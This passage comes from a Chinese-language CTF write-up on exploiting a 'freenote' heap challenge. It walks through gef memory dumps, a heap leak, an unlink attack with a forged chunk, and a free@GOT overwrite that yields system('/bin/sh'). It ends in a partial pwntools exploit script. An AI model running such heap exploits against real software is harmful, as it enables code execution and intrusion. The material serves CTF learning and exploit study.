<span style="color:#ae81ff">0x14d6010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000002</span>
<span style="color:#ae81ff">0x14d6020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7830</span>	<span style="color:#ae81ff">0x0000000000000001</span>
<span style="color:#ae81ff">0x14d6040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x00000000014d78c0</span>
<span style="color:#ae81ff">0x14d6050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7950</span>	<span style="color:#ae81ff">0x0000000000000001</span>
<span style="color:#ae81ff">0x14d6070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x00000000014d79e0</span>
<span style="color:#ae81ff">0x14d6080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
</code></pre></div><p>此时 <code>chunk 2</code> 的信息：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00000000014d7950</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x14d7940</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span>
<span style="color:#ae81ff">0x14d7950</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x00000000014d7820</span> <span style="color:#f92672">=&gt;</span> bk <span style="color:#f92672">!</span>
<span style="color:#ae81ff">0x14d7960</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4343434343434343</span>	<span style="color:#ae81ff">0x4343434343434343</span>
<span style="color:#ae81ff">0x14d7970</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4343434343434343</span>	<span style="color:#ae81ff">0x4343434343434343</span>
<span style="color:#ae81ff">0x14d7980</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4343434343434343</span>	<span style="color:#ae81ff">0x4343434343434343</span>
</code></pre></div><p>泄露出来的 <code>0x00000000014d7820</code> 就是 <code>chunk 0</code> 地址了，当然可以通过计算 <code>size</code> 得到 <code>heap</code> 基址，也就是 <code>table chunk</code> 的地址。但是也可以通过
计算 chunk0-heap 基址得到固定的偏移就好了。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">&gt;&gt;&gt;</span> hex(<span style="color:#ae81ff">0x00000000014d7820</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x00000000014d6000</span>)
<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0x1820</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</code></pre></div><p>接下来再通过</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">delete_note(<span style="color:#ae81ff">0</span>)
delete_note(<span style="color:#ae81ff">1</span>)
delete_note(<span style="color:#ae81ff">3</span>)
</code></pre></div><p>把 <code>chunk</code> 都清理掉，并入 <code>top chunk</code>.</p>
<h4 id="unlink-1">unlink</h4>
<p>接下来 进行 <code>unlink</code> 操作。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">new_note(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span>notelen)
</code></pre></div><p>首先 new 三个 chunk</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x14d6010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x14d6000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000001821</span>
<span style="color:#ae81ff">0x14d6010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000003</span>
<span style="color:#ae81ff">0x14d6020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000001</span>	<span style="color:#ae81ff">0x0000000000000080</span>
<span style="color:#ae81ff">0x14d6030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7830</span>	<span style="color:#ae81ff">0x0000000000000001</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> ptr 
<span style="color:#ae81ff">0x14d6040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x00000000014d78c0</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> ptr
<span style="color:#ae81ff">0x14d6050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000001</span>	<span style="color:#ae81ff">0x0000000000000080</span>
<span style="color:#ae81ff">0x14d6060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7950</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> ptr
<span style="color:#ae81ff">0x14d6070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000014d79e0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#960050;background-color:#1e0010">这是因为</span> ptr <span style="color:#960050;background-color:#1e0010">没清空剩下的</span>
</code></pre></div><p>在 <code>delete chunk 2, delete chunk 1，delete chunk 0 </code>
然后都并入 <code>top chunk 了</code>..</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>   x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x14d6010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x14d6000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000001821</span>
<span style="color:#ae81ff">0x14d6010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7830</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> ptr
<span style="color:#ae81ff">0x14d6040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000014d78c0</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> ptr
<span style="color:#ae81ff">0x14d6050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7950</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> ptr
<span style="color:#ae81ff">0x14d6070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000014d79e0</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">3</span> ptr
</code></pre></div><p>前面泄露得到<code> chunk 0</code> 的 <code>ptr</code>,而 构造时应使 <code>fd = &amp;p-0x18;bk = &amp;p-0x10</code>
伪造 <code>fake chunk</code>,<code>malloc</code>  一个比较大的堆块，会覆盖原来 <code>chunk</code> 的地方，而原来 <code>chunk</code> 还可以进行 <code>free</code> 操作，因此可以利用 <code>unlink。大概</code> <code>chunk overlapping </code>
构造时要注意三个地方：<code>chunk 1 header</code> 中的 <code>pre_size</code>  以及 <code>Pre_inuse</code> 、<code>chunk 2</code> 中的 <code>pre_inuse</code> 要设为 0</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x14d7830</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
<span style="color:#ae81ff">0x14d7820</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000191</span> 
<span style="color:#ae81ff">0x14d7830</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000081</span> <span style="color:#f92672">=&gt;</span> fake chunk header
<span style="color:#ae81ff">0x14d7840</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d6018</span>	<span style="color:#ae81ff">0x00000000014d6020</span> <span style="color:#f92672">=&gt;</span> fake fd bk
<span style="color:#ae81ff">0x14d7850</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d7860</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d7870</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d7880</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d7890</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d78a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d78b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000080</span>	<span style="color:#ae81ff">0x0000000000000090</span> <span style="color:#f92672">=&gt;</span> fake header chunk <span style="color:#ae81ff">1</span>,fake chunk <span style="color:#ae81ff">0</span> size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80</span>,fake pre_inuse 
<span style="color:#ae81ff">0x14d78c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d78d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d78e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d78f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d7900</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d7910</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
gef<span style="color:#960050;background-color:#1e0010">➤</span>  
<span style="color:#ae81ff">0x14d7920</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d7930</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d7940</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000091</span> <span style="color:#f92672">=&gt;</span> fake header  fake pre_inuse <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
<span style="color:#ae81ff">0x14d7950</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d7960</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d7970</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d7980</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d7990</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d79a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d79b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4343434343434343</span>	<span style="color:#ae81ff">0x0000000000020651</span>  <span style="color:#f92672">=&gt;</span> top chunk 
<span style="color:#ae81ff">0x14d79c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4343434343434343</span>	<span style="color:#ae81ff">0x4343434343434343</span>
<span style="color:#ae81ff">0x14d79d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000000001b0</span>	<span style="color:#ae81ff">0x0000000000020631</span> 
<span style="color:#ae81ff">0x14d79e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4444444444444444</span>	<span style="color:#ae81ff">0x4444444444444444</span>
</code></pre></div><p>此时 <code>ptr table</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00000000014d6000</span>
<span style="color:#ae81ff">0x14d6000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000001821</span>
<span style="color:#ae81ff">0x14d6010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000001</span>
<span style="color:#ae81ff">0x14d6020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000001</span>	<span style="color:#ae81ff">0x0000000000000180</span>
<span style="color:#ae81ff">0x14d6030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7830</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000014d78c0</span>
<span style="color:#ae81ff">0x14d6050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7950</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000014d79e0</span>
</code></pre></div><p>如果此时我们 <code>delete 1</code> 就会判断 <code>pre_insue</code> 等位，与前面的 <code>chunk 0 </code>进行合并。得到<code> 0x80+0x9</code>0 大小的 <code>bin</code>，放到 <code>unsorted bin</code>中。 合并的时候进行了 <code>unlink</code> 操作，<code>chunk 0</code> 的 <code>ptr</code> 修改成了 <code>&amp;ptr[0]-0x18</code> 的地方。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00000000014d6000</span>
<span style="color:#ae81ff">0x14d6000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000001821</span>
<span style="color:#ae81ff">0x14d6010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000001</span>	<span style="color:#ae81ff">0x0000000000000180</span> <span style="color:#f92672">=&gt;</span>chunk <span style="color:#ae81ff">0</span> flag <span style="color:#f92672">|</span> chunk <span style="color:#ae81ff">0</span> size 
<span style="color:#ae81ff">0x14d6030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d6018</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> ptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>ptr[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">0x18</span>
<span style="color:#ae81ff">0x14d6040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000014d78c0</span>
<span style="color:#ae81ff">0x14d6050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00000000014d7950</span>	<span style="color:#ae81ff">0x0000000000000000</span>
<span style="color:#ae81ff">0x14d6070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00000000014d79e0</span>
</code></pre></div><p>这个时候就很简单啦
我们 <code>edit chunk 0</code>,就是修改 <code>&amp;ptr[0]-0x18 </code>指向的内容，可以修改 <code>ptr[0]</code>之类的<br>
写入内容 <code>：p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + &quot;A&quot;*16 + p64(binsh_addr)</code> <br>
就把 <code>ptr[0]</code>改为了 <code>free_got</code>,同时将 <code>chunk 0</code> 的 <code>flag</code> 设为 <code>1，size</code> 设为 <code>0x8</code>; 否则下次 <code>edit</code> <code>时，size</code> 不匹配会进行 <code>realloc</code>。将 <code>chunk 1 ptr</code> 改为 <code>/bin/sh</code> 字符串的地址
可以来看一下写入的内容</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x14d6010</span>
<span style="color:#ae81ff">0x14d6010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000100</span>	<span style="color:#ae81ff">0x0000000000000080</span>
<span style="color:#ae81ff">0x14d6020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000001</span>	<span style="color:#ae81ff">0x0000000000000008</span>
<span style="color:#ae81ff">0x14d6030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000602018</span>	<span style="color:#ae81ff">0x4141414141414141</span> 
<span style="color:#ae81ff">0x14d6040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x00007f13b0022d57</span> 
<span style="color:#ae81ff">0x14d6050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d6060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
<span style="color:#ae81ff">0x14d6070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x4141414141414141</span>	<span style="color:#ae81ff">0x4141414141414141</span>
gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x0000000000602018</span>
<span style="color:#ae81ff">0x602018</span> <span style="color:#f92672">&lt;</span>free<span style="color:#960050;background-color:#1e0010">@</span>got.plt<span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00007f13aff1a4f0</span>	<span style="color:#ae81ff">0x00007f13aff05690</span>
gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>s <span style="color:#ae81ff">0x00007f13b0022d57</span>
<span style="color:#ae81ff">0x7f13b0022d57</span><span style="color:#f92672">:</span>	<span style="color:#e6db74">&#34;/bin/sh&#34;</span>  
</code></pre></div><p>通过 <code>edit 0</code>，将 <code>free_got</code> 改为 <code>system</code> 地址，在<code> free(1)</code> ，相当于调用了 <code>system(&quot;/bin/sh&quot;)</code></p>
<p>最终<code>payload</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./freenote&#39;</span>)

libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_note</span>(x):
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your choice: &#34;</span>)
    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Length of new note: &#34;</span>)
    p<span style="color:#f92672">.</span>send(str(len(x))<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Enter your note: &#34;</span>)
    p<span style="color:#f92672">.</span>send(x)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_note</span>(x):
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your choice: &#34;</span>)
    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Note number: &#34;</span>)
    p<span style="color:#f92672">.</span>send(str(x)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_note</span>():
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your choice: &#34;</span>)
    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
    
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_note</span>(x,y):
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your choice: &#34;</span>)
    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)   
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Note number: &#34;</span>)
    p<span style="color:#f92672">.</span>send(str(x)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)   
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Length of note: &#34;</span>)
    p<span style="color:#f92672">.</span>send(str(len(y))<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)   
    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Enter your note: &#34;</span>)
    p<span style="color:#f92672">.</span>send(y)
    
<span style="color:#75715e">####################leak libc#########################</span>

notelen<span style="color:#f92672">=</span><span style="color:#ae81ff">0x80</span>

new_note(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>notelen)
delete_note(<span style="color:#ae81ff">0</span>)

new_note(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x78</span><span style="color:#e6db74">&#34;</span>)
<span style="color:#75715e">#gdb.attach(p)</span>
list_note()
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;0. &#34;</span>)
leak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
<span style="color:#66d9ef">print</span> leak[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;hex&#39;</span>)
leaklibcaddr <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
<span style="color:#66d9ef">print</span> hex(leaklibcaddr)
delete_note(<span style="color:#ae81ff">1</span>)
delete_note(<span style="color:#ae81ff">0</span>)

libc_base_addr <span style="color:#f92672">=</span> leaklibcaddr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3c4b78</span>
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;libc_base: &#34;</span> <span style="color:#f92672">+</span> hex(libc_base_addr)

system_sh_addr <span style="color:#f92672">=</span> libc_base_addr <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;system_sh_addr: &#34;</span> <span style="color:#f92672">+</span> hex(system_sh_addr)

binsh_addr <span style="color:#f92672">=</span> libc_base_addr <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;binsh_addr: &#34;</span> <span style="color:#f92672">+</span> hex(binsh_addr)


<span style="color:#75715e">####################leak heap#########################</span>

notelen<span style="color:#f92672">=</span><span style="color:#ae81ff">0x80</span>

new_note(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>notelen)<span style="color:#75715e">#0</span>
new_note(<span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span>notelen)
new_note(<span style="color:#e6db74">&#34;D&#34;</span><span style="color:#f92672">*</span>notelen)
delete_note(<span style="color:#ae81ff">2</span>)
delete_note(<span style="color:#ae81ff">0</span>)

<span style="color:#75715e">#gdb.attach(p)</span>
<span style="color:#75715e">#raw_input()</span>
new_note(<span style="color:#e6db74">&#34;AAAAAAAA&#34;</span>)
list_note()
p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;0. AAAAAAAA&#34;</span>)
